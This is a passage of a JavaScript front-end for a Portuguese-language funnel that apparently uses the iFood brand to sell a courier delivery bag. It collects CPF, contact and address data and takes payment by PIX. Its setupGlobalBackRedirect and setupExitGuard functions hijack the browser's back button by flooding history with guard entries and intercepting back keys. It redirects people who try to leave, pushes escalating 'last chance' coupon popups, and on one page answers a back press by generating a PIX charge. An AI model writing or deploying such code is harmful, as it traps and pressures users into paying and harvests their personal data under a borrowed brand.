const questions = {
    start: {
        id: 'start',
        text: 'Você já realiza entregas pelo iFood?',
        options: [
            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
        ]
    },
    tempo_atividade: {
        id: 'tempo_atividade',
        text: 'Há quanto tempo você está nas entregas?',
        options: [
            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
        ]
    },
    possu_veiculo: {
        id: 'possu_veiculo',
        text: 'Você já tem veículo para entregas?',
        options: [
            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
        ]
    },
    tipo_veiculo: {
        id: 'tipo_veiculo',
        text: 'Qual será seu principal meio de entrega?',
        options: [
            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
        ]
    },
    cnh_status: {
        id: 'cnh_status',
        text: 'Qual é a situação da sua CNH?',
        options: [
            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
        ]
    },
    disponibilidade: {
        id: 'disponibilidade',
        text: 'Quantas horas por dia você pretende ficar online?',
        options: [
            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
        ]
    },
    objetivo_renda: {
        id: 'objetivo_renda',
        text: 'Qual é seu objetivo com as entregas?',
        options: [
            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
        ]
    },
    regiao_preferencia: {
        id: 'regiao_preferencia',
        text: 'Onde você prefere atuar?',
        options: [
            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
        ]
    },
    equipamento: {
        id: 'equipamento',
        text: 'Você já tem bag térmica em boas condições?',
        options: [
            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
        ]
    },
    horario_pico: {
        id: 'horario_pico',
        text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
        options: [
            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
        ]
    }
};

const STORAGE_KEYS = {
    personal: 'ifoodbag.personal',
    address: 'ifoodbag.address',
    quizComplete: 'ifoodbag.quizComplete',
    stage: 'ifoodbag.stage',
    stock: 'ifoodbag.stock',
    returnTo: 'ifoodbag.returnTo',
    shipping: 'ifoodbag.shipping',
    addressExtra: 'ifoodbag.addressExtra',
    pix: 'ifoodbag.pix',
    bump: 'ifoodbag.bump',
    leadSession: 'ifoodbag.leadSession',
    utm: 'ifoodbag.utm',
    pixelConfig: 'ifoodbag.pixelConfig',
    coupon: 'ifoodbag.coupon',
    directCheckout: 'ifoodbag.directCheckout',
    vslCompleted: 'ifoodbag.vslCompleted',
    orderbumpBackAutoPix: 'ifoodbag.orderbumpBackAutoPix',
    pixCreateLock: 'ifoodbag.pixCreateLock'
};

const state = {
    currentQuestionKey: 'start',
    currentStepIndex: 1,
    totalSteps: 0,
    answerLocked: false,
    timerId: null,
    apiSessionPromise: null,
    apiSessionAt: 0,
    pixelConfig: null,
    pixelConfigAt: 0,
    siteConfig: null,
    siteConfigAt: 0,
    toastTimeout: null,
    pixCreatePromise: null,
    pixCreateKey: '',
    pixCreateAt: 0
};

const dom = {};
const pathMemo = {};

document.addEventListener('DOMContentLoaded', () => {
    const page = document.body.dataset.page || '';
    cacheCommonDom();
    captureUtmParams();
    ensureApiSession().catch(() => null);
    if (page !== 'admin') {
        initMarketing().catch(() => null);
    }
    initStockCounter();

    if (page && page !== 'admin') {
        trackPageView(page);
    }
    setupExitGuard(page);
    setupGlobalBackRedirect(page);
    switch (page) {
        case 'home':
            initHome();
            break;
        case 'quiz':
            initQuiz();
            break;
        case 'personal':
            initPersonal();
            break;
        case 'cep':
            initCep();
            break;
        case 'processing':
            initProcessing();
            break;
        case 'success':
            initSuccess();
            break;
        case 'checkout':
            initCheckout();
            break;
        case 'orderbump':
            initOrderBump();
            break;
        case 'pix':
            initPix();
            break;
        case 'upsell':
            initUpsell();
            break;
        case 'admin':
            initAdmin();
            break;
        default:
            break;
    }
});

function setupGlobalBackRedirect(page) {
    if (!page) {
        const rawPath = String(window.location.pathname || '')
            .trim()
            .toLowerCase()
            .replace(/^\/+|\/+$/g, '')
            .replace(/\.html$/g, '');
        const aliases = {
            '': 'home',
            index: 'home',
            dados: 'personal',
            endereco: 'cep',
            processando: 'processing',
            sucesso: 'success'
        };
        page = aliases[rawPath] || rawPath || 'home';
    }
    if (page === 'admin') return;
    if (window.__ifoodBackRedirectInit) return;
    window.__ifoodBackRedirectInit = true;
    if (window.__ifbEarlyRedirectTimer) {
        clearTimeout(window.__ifbEarlyRedirectTimer);
        window.__ifbEarlyRedirectTimer = null;
    }

    let shownOfferLevel = 0;
    let backAttemptTracked = false;
    let backAttemptAt = 0;
    let orderbumpBackInFlight = false;
    const guardDepth = 12;
    const guardToken = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    const stateBase = { ifb: true, token: guardToken };
    const firstOffer = getBackRedirectOffer(page, 1);
    const secondOffer = getBackRedirectOffer(page, 2);
    const canEscalateOffer = (
        firstOffer.mode === 'coupon' &&
        secondOffer.mode === 'coupon' &&
        Number(secondOffer.amountOff || 0) > Number(firstOffer.amountOff || 0)
    );
    if (canEscalateOffer) {
        const currentCoupon = loadCoupon();
        const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
        if (currentAmountOff >= Number(secondOffer.amountOff || 0)) {
            shownOfferLevel = 2;
        } else if (currentAmountOff >= Number(firstOffer.amountOff || 0)) {
            shownOfferLevel = 1;
        }
    }
    let activeOffer = firstOffer;
    let lastGuardAt = 0;
    const currentHash = window.location.hash || '';
    const legacyBackHash = /^#ifb-back-/i.test(currentHash);
    const stableHash = legacyBackHash ? '' : currentHash;
    const baseUrl = `${window.location.pathname}${window.location.search}${stableHash}`;

    if (legacyBackHash) {
        try {
            history.replaceState(history.state || {}, '', baseUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    }

    const modalEls = ensureCouponModalElements();
    const modal = modalEls.modal;
    const btnApply = modalEls.btnApply;
    const couponTitle = modalEls.couponTitle;
    const couponMessage = modalEls.couponMessage;
    const couponBadge = modalEls.couponBadge;
    const couponSubtitle = modalEls.couponSubtitle;
    const applyOfferToModal = (offerConfig) => {
        if (couponBadge) {
            couponBadge.textContent = offerConfig.badge;
        }
        if (couponTitle) {
            couponTitle.textContent = offerConfig.title;
        }
        if (couponMessage) {
            couponMessage.textContent = offerConfig.message;
        }
        if (couponSubtitle) {
            couponSubtitle.textContent = offerConfig.subtitle;
        }
        if (btnApply) {
            btnApply.textContent = offerConfig.cta;
        }
    };
    applyOfferToModal(activeOffer);

    const resolveTargetUrl = () => buildDistinctBackRedirectUrl(page);
    window.__ifbResolveBackRedirect = () => buildDistinctBackRedirectUrl(page);
    const markBackAttempt = () => {
        if (backAttemptTracked) return;
        backAttemptTracked = true;
        trackPageView(`backredirect_${page}`);
        trackLead('backredirect_click', { stage: page });
    };

    const showCouponModal = (offerConfig = activeOffer) => {
        activeOffer = offerConfig;
        applyOfferToModal(activeOffer);
        modal.classList.remove('hidden');
        modal.setAttribute('aria-hidden', 'false');
        modal.classList.remove('coupon-anim-in');
        void modal.offsetWidth;
        modal.classList.add('coupon-anim-in');
        trackLead(activeOffer.shownEvent, { stage: page, backOfferLevel: shownOfferLevel || 1 });
    };

    const hideCouponModal = () => {
        modal.classList.remove('coupon-anim-in');
        modal.classList.add('hidden');
        modal.setAttribute('aria-hidden', 'true');
    };

    const ensureGuardEntry = (force = false) => {
        const now = Date.now();
        if (!force && (now - lastGuardAt) < 120) return;
        const state = history.state || {};
        if (state.ifb && state.token === guardToken && Number(state.step || 0) >= guardDepth) return;
        try {
            history.replaceState({ ...stateBase, step: 0 }, '', baseUrl);
            for (let step = 1; step <= guardDepth; step += 1) {
                history.pushState({ ...stateBase, step }, '', baseUrl);
            }
            lastGuardAt = now;
        } catch (error) {
            return;
        }
    };

    const handleBackAttempt = (event = null) => {
        const backState = (
            event && typeof event === 'object' && event.state !== undefined
                ? event.state
                : history.state
        ) || {};
        const isGuardState = backState?.ifb === true && backState?.token === guardToken;
        if (event?.type === 'popstate' && !isGuardState) {
            ensureGuardEntry(true);
            return;
        }
        const now = Date.now();
        if ((now - backAttemptAt) < 40) return;
        backAttemptAt = now;
        ensureGuardEntry(true);
        markBackAttempt();

        if (page === 'orderbump') {
            if (orderbumpBackInFlight) return;
            const shippingStored = loadShipping();
            if (!isShippingSelectionComplete(shippingStored)) {
                localStorage.removeItem(STORAGE_KEYS.shipping);
                setStage('checkout');
                redirect('checkout.html?forceFrete=1');
                return;
            }
            const currentCoupon = loadCoupon();
            const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
            const shouldAutoApplyBackCoupon = currentAmountOff <= 0;
            if (shouldAutoApplyBackCoupon) {
                saveCoupon({
                    code: 'FRETE5',
                    amountOff: 5,
                    appliedAt: Date.now(),
                    source: 'orderbump_back_auto',
                    backOfferLevel: 1
                });
            }
            const shipping = applyCouponToShipping(shippingStored);

            orderbumpBackInFlight = true;
            saveBump({
                selected: false,
                price: 0,
                title: 'Seguro Bag'
            });
            trackLead('orderbump_back_skip', {
                stage: 'orderbump',
                shipping,
                autoCouponApplied: shouldAutoApplyBackCoupon,
                couponAmountOff: shouldAutoApplyBackCoupon ? 5 : currentAmountOff
            });
            showToast(
                shouldAutoApplyBackCoupon
                    ? 'Gerando PIX com R$ 5,00 de desconto no frete...'
                    : 'Gerando pagamento...',
                'success'
            );

            createPixCharge(shipping, 0, {
                sourceStage: shouldAutoApplyBackCoupon
                    ? 'orderbump_back_direct_coupon5'
                    : 'orderbump_back_direct'
            })
                .catch((error) => {
                    orderbumpBackInFlight = false;
                    showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                });
            return;
        }

        if (shownOfferLevel >= 1 && (!canEscalateOffer || shownOfferLevel >= 2)) {
            redirect(resolveTargetUrl());
            return;
        }
        if (shownOfferLevel === 1 && canEscalateOffer) {
            shownOfferLevel = 2;
            showCouponModal(secondOffer);
            try {
                history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
            } catch (_error) {
                // Ignore browser-specific history restrictions.
            }
            return;
        }
        shownOfferLevel = 1;
        showCouponModal(firstOffer);
        try {
            history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    };

    const reinforceGuards = () => {
        ensureGuardEntry();
    };
    ensureGuardEntry(true);
    setTimeout(reinforceGuards, 250);
    setTimeout(reinforceGuards, 1000);
    window.addEventListener('pointerdown', reinforceGuards, { passive: true, once: true });
    window.addEventListener('touchstart', reinforceGuards, { passive: true, once: true });
    window.addEventListener('keydown', reinforceGuards, { once: true });
    window.addEventListener('focus', reinforceGuards, { passive: true });
    window.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'visible') reinforceGuards();
    });
    window.addEventListener('pageshow', (event) => {
        if (event.persisted) {
            reinforceGuards();
        }
    });
    window.addEventListener('load', () => {
        reinforceGuards();
    }, { once: true });
    window.addEventListener('popstate', (event) => {
        if (window.__ifbAllowUnload) return;
        handleBackAttempt(event);
    });
    window.addEventListener('hashchange', () => {
        if (window.__ifbAllowUnload) return;
        handleBackAttempt({ state: history.state, type: 'hashchange' });
    });
    window.addEventListener('keydown', (event) => {
        const key = String(event.key || '').toLowerCase();
        const isBackspace = key === 'backspace';
        const isAltLeft = key === 'arrowleft' && event.altKey;
        if (!isBackspace && !isAltLeft) return;
        const tag = String(event.target?.tagName || '').toLowerCase();
        const isInputLike = tag === 'input' || tag === 'textarea' || event.target?.isContentEditable;
        if (isInputLike && isBackspace) return;
        event.preventDefault();
        handleBackAttempt({ state: history.state, type: 'keydown' });
    });
    const guardPulse = setInterval(() => {
        if (window.__ifbAllowUnload) {
            clearInterval(guardPulse);
            return;
        }
        if (document.visibilityState === 'visible') reinforceGuards();
    }, 900);

    if (btnApply) {
        btnApply.addEventListener('click', async () => {
            if (btnApply.disabled) return;
            let copiedPix = false;
            const originalCta = btnApply.textContent;
            if (activeOffer.mode === 'pix-copy') {
                copiedPix = await copyPixCodeFromField();
            } else if (activeOffer.mode === 'coupon') {
                const amountOff = Number(activeOffer.amountOff || 5);
                const safeAmountOff = Number.isFinite(amountOff) && amountOff > 0 ? amountOff : 5;
                const couponCode = String(activeOffer.couponCode || (safeAmountOff >= 10 ? 'FRETE10' : 'FRETE5')).trim();
                saveCoupon({
                    code: couponCode || 'FRETE5',
                    amountOff: safeAmountOff,
                    appliedAt: Date.now(),
                    source: 'backredirect',
                    backOfferLevel: shownOfferLevel || 1
                });
                sessionStorage.setItem(STORAGE_KEYS.directCheckout, '1');

                if (page === 'pix') {
                    const pix = loadPix();
                    const isUpsellPix = Boolean(pix?.isUpsell || pix?.upsell?.enabled);
                    if (!isUpsellPix) {
                        const shippingStored = loadShipping();
                        const shippingWithCoupon = applyCouponToShipping(shippingStored);
                        const bump = loadBump() || {};
                        const bumpSelected = bump?.selected === true && Number(bump?.price || 0) > 0;
                        const bumpPrice = bumpSelected ? Number(bump.price || 0) : 0;
                        const fallbackShippingBase = Math.max(0, Number((Number(pix?.amount || 0) - bumpPrice).toFixed(2)));
                        const shippingForRegeneration = shippingWithCoupon || (
                            shippingStored
                                ? applyCouponToShipping({
                                    ...shippingStored,
                                    basePrice: Number(shippingStored.basePrice || shippingStored.originalPrice || shippingStored.price || 0),
                                    originalPrice: Number(shippingStored.originalPrice || shippingStored.basePrice || shippingStored.price || 0)
                                })
                                : null
                        ) || (
                            pix
                                ? applyCouponToShipping({
                                    id: String(pix?.shippingId || 'padrao'),
                                    name: String(pix?.shippingName || 'Envio Padrão iFood'),
                                    eta: '',
                                    price: fallbackShippingBase,
                                    basePrice: fallbackShippingBase,
                                    originalPrice: fallbackShippingBase
                                })
                                : null
                        );

                        if (shippingForRegeneration) {
                            btnApply.disabled = true;
                            btnApply.textContent = 'Gerando novo PIX...';
                            try {
                                trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
                                setStage('checkout');
                                await createPixCharge(shippingForRegeneration, bumpPrice, { sourceStage: 'backredirect_pix_coupon' });
                                return;
                            } catch (error) {
                                showToast(error?.message || 'Nao foi possivel gerar um novo PIX com desconto agora.', 'error');
                                btnApply.disabled = false;
                                btnApply.textContent = originalCta;
                                return;
                            }
                        }
                    }
                }
            }
            hideCouponModal();
            trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
            if (activeOffer.mode === 'pix-copy') return;
            if (activeOffer.mode === 'coupon') setStage('checkout');
            redirect(resolveTargetUrl());
        });
    }
}

function setupExitGuard(page) {
    if (!page || page === 'admin') return;
    if (window.__ifbExitGuardInit) return;
    window.__ifbExitGuardInit = true;
    window.__ifbAllowUnload = false;
    window.addEventListener('pagehide', (event) => {
        if (window.__ifbAllowUnload) return;
        if (event?.persisted) return;
        setTimeout(() => {
            if (!window.__ifbAllowUnload) window.location.href = buildDistinctBackRedirectUrl(page);
        }, 0);
    });
}

function getBackRedirectOffer(page, level = 1) {
    if (Number(level || 1) >= 2) {
        return {
            mode: 'coupon',
            badge: 'Ultima chance',
            title: 'Tem certeza que nao quer R$ 10,00 de desconto?',
            message: 'Aplicamos mais R$ 5,00 e seu desconto total no frete agora e de R$ 10,00.',
            subtitle: 'Cupom de R$ 10 valido apenas nesta sessao',
            cta: 'Usar cupom de R$ 10 agora',
            shownEvent: 'coupon_offer_boost_shown',
            acceptEvent: 'coupon_offer_boost_accept',
            couponCode: 'FRETE10',
            amountOff: 10
        };
    }
    if (page === 'pix') {
        return {
            mode: 'coupon',
            badge: 'Pagamento pendente',
            title: 'Volte agora e pague R$ 5,00 a menos no frete',
            message: 'Seu PIX ainda esta pendente. Vamos reduzir R$ 5,00 no frete e gerar um novo PIX com desconto.',
            subtitle: 'Oferta valida apenas nesta sessao',
            cta: 'Usar cupom de R$ 5 agora',
            shownEvent: 'coupon_offer_shown',
            acceptEvent: 'coupon_offer_accept',
            couponCode: 'FRETE5',
            amountOff: 5
        };
    }
    if (page === 'upsell') {
        return {
            mode: 'coupon',
            badge: 'Desconto exclusivo',
            title: 'Volte agora com R$ 5,00 de desconto',
            message: 'Ativamos um cupom para voce concluir sem perder a oferta desta sessao.',
            subtitle: 'Cupom imediato para finalizar hoje',
            cta: 'Usar cupom de R$ 5 agora',
            shownEvent: 'coupon_offer_shown',
            acceptEvent: 'coupon_offer_accept',
            couponCode: 'FRETE5',
            amountOff: 5
        };
    }
    return {
        mode: 'coupon',
        badge: 'Cupom exclusivo',
        title: 'Desconto liberado no frete',
        message: 'Voce ganhou R$ 5,00 de desconto no frete da Bag.',
        subtitle: 'Oferta valida agora nesta sessao',
        cta: 'Usar cupom e pagar mais barato',
        shownEvent: 'coupon_offer_shown',
        acceptEvent: 'coupon_offer_accept',
        couponCode: 'FRETE5',
        amountOff: 5
    };
}

async function copyPixCodeFromField() {
    const pixCode = document.getElementById('pix-code');
    const value = String(pixCode?.value || '').trim();
    if (!value) return false;
    if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
        try {
            await navigator.clipboard.writeText(value);
            return true;
        } catch (error) {
            // Fallback below
        }
    }
    try {
        pixCode?.select?.();
        document.execCommand('copy');
        return true;
    } catch (error) {
        return false;
    }
}

function ensureCouponModalElements() {
    let modal = document.getElementById('coupon-modal');
    if (!modal) {
        const wrapper = document.createElement('div');
        wrapper.innerHTML = `
            <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
                <div class="modal-card">
                    <div class="coupon-hero">
                        <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
                    </div>
                    <span id="coupon-badge" class="modal-badge">Cupom exclusivo</span>
                    <h3 id="coupon-title">Desconto liberado no frete</h3>
                    <p id="coupon-message">Você ganhou R$ 5,00 de desconto no frete da Bag.</p>
                    <span id="coupon-subtitle" class="coupon-subtitle">Oferta válida agora nesta sessão</span>
                    <button id="btn-coupon-apply" class="btn-primary" type="button">Usar cupom e pagar mais barato</button>
                </div>
            </div>
        `;
        document.body.appendChild(wrapper.firstElementChild);
        modal = document.getElementById('coupon-modal');
    }

    return {
        modal,
        btnApply: document.getElementById('btn-coupon-apply'),
        couponBadge: document.getElementById('coupon-badge'),
        couponTitle: document.getElementById('coupon-title'),
        couponMessage: document.getElementById('coupon-message'),
        couponSubtitle: document.getElementById('coupon-subtitle')
    };
}

function cacheCommonDom() {
    dom.stockCounter = document.getElementById('stock-counter');
    dom.toast = document.getElementById('toast');
}

function initHome() {
    const btnStart = document.getElementById('btn-start');

    btnStart?.addEventListener('click', () => {
        resetFlow();
        setStage('quiz');
        trackLead('quiz_started', { stage: 'quiz' });
        redirect('quiz.html');
    });
}

function initQuiz() {
    const currentStage = getStage();
    if (!currentStage || currentStage === 'quiz' || currentStage === 'personal') {
        setStage('quiz');
    }
    trackLead('quiz_view', { stage: 'quiz' });

    const questionText = document.getElementById('question-text');
    const optionsContainer = document.getElementById('options-container');
    const questionCount = document.getElementById('question-count');
    const progressFill = document.getElementById('progress-fill');

    if (!questionText || !optionsContainer || !questionCount || !progressFill) return;

    state.currentQuestionKey = 'start';
    state.currentStepIndex = 1;
    state.totalSteps = maxPathLengthFrom('start');
    state.answerLocked = false;

    renderQuestion(questions.start, {
        questionText,
        optionsContainer,
        questionCount,
        progressFill
    });
}

const COMMON_EMAIL_DOMAINS = [
    'gmail.com',
    'hotmail.com',
    'outlook.com',
    'icloud.com',
    'live.com',
    'yahoo.com.br',
    'uol.com.br',
    'bol.com.br'
];

function setupEmailAutocomplete(emailInput) {
    if (!emailInput) return;
    const group = emailInput.closest('.input-group');
    if (!group) return;

    let box = group.querySelector('.email-suggest');
    if (!box) {
        box = document.createElement('div');
        box.className = 'email-suggest hidden';
        box.setAttribute('role', 'listbox');
        box.setAttribute('aria-label', 'Sugestoes de e-mail');
        group.appendChild(box);
    }

    let activeIndex = -1;
    let currentSuggestions = [];

    const normalize = (value) => String(value || '').trim().toLowerCase().replace(/\s+/g, '');
    const escapeText = (value) => String(value || '').replace(/[&<>"']/g, (char) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }[char]));

    const hide = () => {
        box.classList.add('hidden');
        box.innerHTML = '';
        activeIndex = -1;
        currentSuggestions = [];
    };

    const getSuggestions = (rawValue) => {
        const value = normalize(rawValue);
        if (!value) return [];
        if (value.startsWith('@')) return [];
        const atCount = (value.match(/@/g) || []).length;
        if (atCount > 1) return [];

        const [localRaw = '', domainRaw = ''] = value.split('@');
        const local = localRaw.replace(/[^a-z0-9._%+-]/g, '');
        if (local.length < 2) return [];

        const filteredDomains = COMMON_EMAIL_DOMAINS.filter((domain) => !domainRaw || domain.startsWith(domainRaw));
        return filteredDomains
            .slice(0, 6)
            .map((domain) => `${local}@${domain}`)
            .filter((suggestion) => suggestion !== value);
    };

    const setActive = (nextIndex) => {
        activeIndex = nextIndex;
        const buttons = box.querySelectorAll('.email-suggest__item');
        buttons.forEach((button, index) => {
            button.classList.toggle('email-suggest__item--active', index === activeIndex);
        });
    };

    const applySuggestion = (value) => {
        emailInput.value = value;
        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
        hide();
        emailInput.focus();
    };

    const render = (suggestions) => {
        if (!suggestions.length) {
            hide();
            return;
        }

        currentSuggestions = suggestions;
        box.innerHTML = suggestions.map((item, index) => `
            <button type="button" class="email-suggest__item${index === 0 ? ' email-suggest__item--active' : ''}" data-value="${escapeText(item)}">
                ${escapeText(item)}
            </button>
        `).join('');
        setActive(0);
        box.classList.remove('hidden');
    };

    emailInput.addEventListener('input', () => {
        render(getSuggestions(emailInput.value));
    });

    emailInput.addEventListener('focus', () => {
        if (emailInput.value) {
            render(getSuggestions(emailInput.value));
        }
    });

    emailInput.addEventListener('keydown', (event) => {
        if (box.classList.contains('hidden') || !currentSuggestions.length) return;

        if (event.key === 'ArrowDown') {
            event.preventDefault();
            const next = (activeIndex + 1) % currentSuggestions.length;
            setActive(next);
            return;
        }
        if (event.key === 'ArrowUp') {
            event.preventDefault();
            const prev = (activeIndex - 1 + currentSuggestions.length) % currentSuggestions.length;
            setActive(prev);
            return;
        }
        if (event.key === 'Enter' && activeIndex >= 0) {
            event.preventDefault();
            applySuggestion(currentSuggestions[activeIndex]);
            return;
        }
        if (event.key === 'Escape') {
            hide();
        }
    });

    box.addEventListener('mousedown', (event) => {
        event.preventDefault();
    });

    box.addEventListener('click', (event) => {
        const button = event.target.closest('.email-suggest__item');
        if (!button) return;
        const selected = String(button.getAttribute('data-value') || '').trim();
        if (selected) applySuggestion(selected);
    });

    document.addEventListener('click', (event) => {
        if (!group.contains(event.target)) hide();
    });
}

function initPersonal() {
    setStage('personal');
    trackLead('personal_view', { stage: 'personal' });
    const returnTo = getReturnTarget();

    const form = document.getElementById('personal-form');
    const fullname = document.getElementById('fullname');
    const cpf = document.getElementById('cpf');
    const email = document.getElementById('email');
    const phone = document.getElementById('phone');
    const birthdate = document.getElementById('birthdate');
    const errorBox = document.getElementById('personal-error');

    const personal = loadPersonal();
    if (personal) {
        if (fullname) fullname.value = personal.name || '';
        if (cpf) cpf.value = personal.cpf || '';
        if (email) email.value = personal.email || '';
        if (phone) phone.value = personal.phone || '';
        if (birthdate) birthdate.value = personal.birth || '';
    }

    cpf?.addEventListener('input', () => maskCPF(cpf));
    phone?.addEventListener('input', () => maskPhone(phone));
    birthdate?.addEventListener('input', () => maskDate(birthdate));
    setupEmailAutocomplete(email);

    form?.addEventListener('submit', (event) => {
        event.preventDefault();
        clearInlineError(errorBox);

        const nameValue = fullname?.value.trim() || '';
        const cpfValue = cpf?.value.trim() || '';
        const emailValue = email?.value.trim() || '';
        const phoneValue = phone?.value.trim() || '';
        const birthValue = birthdate?.value.trim() || '';

        if (nameValue.length < 3) {
            showInlineError(errorBox, 'Por favor, digite seu nome completo.');
            return;
        }

        if (!isValidDate(birthValue)) {
            showInlineError(errorBox, 'Digite uma data válida (DD/MM/AAAA).');
            return;
        }

        if (!validateCPF(cpfValue)) {
            showInlineError(errorBox, 'CPF inválido. Verifique os números digitados.');
            return;
        }

        if (!isValidEmail(emailValue)) {
            showInlineError(errorBox, 'Digite um e-mail válido.');
            return;
        }

        if (!isValidPhone(phoneValue)) {
            showInlineError(errorBox, 'Digite um telefone válido com DDD.');
            return;
        }

        savePersonal({
            name: nameValue,
            cpf: cpfValue,
            birth: birthValue,
            email: emailValue,
            phone: phoneValue,
            phoneDigits: phoneValue.replace(/\D/g, '')
        });
        sessionStorage.removeItem(STORAGE_KEYS.directCheckout);
        trackLead('personal_submitted', {
            stage: 'personal',
            personal: loadPersonal()
        });

        if (returnTo === 'checkout' && loadAddress()) {
            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
            setStage('checkout');
            redirect('checkout.html');
            return;
        }

        setStage('cep');
        redirect('endereco.html');
    });

    focusFirstControl(form);
}

function initCep() {
    if (!requirePersonal()) return;
    setStage('cep');
    trackLead('cep_view', { stage: 'cep' });
    const returnTo = getReturnTarget();

    const cepInput = document.getElementById('cep-input');
    const errorBox = document.getElementById('cep-error');
    const btnBuscar = document.getElementById('btn-buscar-cep');
    const loadingRow = document.getElementById('cep-loading');
    const addressResult = document.getElementById('address-result');
    const addrStreet = document.getElementById('addr-street');
    const addrCity = document.getElementById('addr-city');
    const freightBox = document.getElementById('freight-calculation');
    const btnConfirm = document.getElementById('btn-confirm-address');

    const savedAddress = loadAddress();
    if (savedAddress && cepInput) {
        cepInput.value = savedAddress.cep || '';
        if (addrStreet) addrStreet.innerText = savedAddress.streetLine || '';
        if (addrCity) addrCity.innerText = savedAddress.cityLine || '';
        setHidden(addressResult, false);
        setHidden(freightBox, false);
        btnBuscar?.classList.add('hidden');
    }

    cepInput?.addEventListener('input', () => {
        maskCep(cepInput);
        resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow);
    });

    const fetchCepData = async (rawCep, retry = 1) => {
        let attempt = 0;
        while (attempt <= retry) {
            try {
                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`, { cache: 'no-store' });
                if (!response.ok) throw new Error('CEP nao encontrado');
                return await response.json();
            } catch (error) {
                if (attempt >= retry) throw error;
                await new Promise((resolve) => setTimeout(resolve, 450 * (attempt + 1)));
                attempt += 1;
            }
        }
        throw new Error('CEP nao encontrado');
    };

    btnBuscar?.addEventListener('click', async () => {
        if (!cepInput) return;
        clearInlineError(errorBox);

        const rawCep = cepInput.value.replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showInlineError(errorBox, 'Por favor, digite um CEP válido.');
            return;
        }

        const minDelayMs = 1200;
        const startTime = Date.now();

        btnBuscar.innerText = 'Consultando...';
        btnBuscar.disabled = true;
        setHidden(loadingRow, false);

        try {
            const data = await fetchCepData(rawCep, 1);
            const street = (data.street || '').trim();
            const neighborhood = (data.neighborhood || '').trim();
            const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
            const city = (data.city || 'Cidade não informada').trim();
            const stateUf = (data.state || '').trim();
            const cityLine = stateUf ? `${city} - ${stateUf}` : city;

            if (addrStreet) addrStreet.innerText = streetLine;
            if (addrCity) addrCity.innerText = cityLine;

            saveAddress({
                streetLine,
                cityLine,
                cep: formatCep(rawCep),
                street,
                neighborhood,
                city,
                state: stateUf
            });
            trackLead('cep_confirmed', {
                stage: 'cep',
                address: loadAddress()
            });

            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, minDelayMs - elapsed);

            setTimeout(() => {
                setHidden(loadingRow, true);
                setHidden(addressResult, false);
                setHidden(freightBox, false);
                btnBuscar.classList.add('hidden');
                btnBuscar.innerText = 'Verificar disponibilidade';
                btnBuscar.disabled = false;
            }, remaining);
        } catch (error) {
            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, minDelayMs - elapsed);

            setTimeout(() => {
                setHidden(loadingRow, true);
                showInlineError(errorBox, 'CEP nao encontrado ou servico indisponivel. Verifique e tente novamente.');
                btnBuscar.innerText = 'Verificar disponibilidade';
                btnBuscar.disabled = false;
            }, remaining);
        }
    });

    btnConfirm?.addEventListener('click', () => {
        if (!loadAddress()) {
            showInlineError(errorBox, 'Confirme o CEP para continuar.');
            return;
        }
        if (returnTo === 'checkout') {
            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
            setStage('checkout');
            redirect('checkout.html');
            return;
        }
        setStage('processing');
        redirect('processando.html');
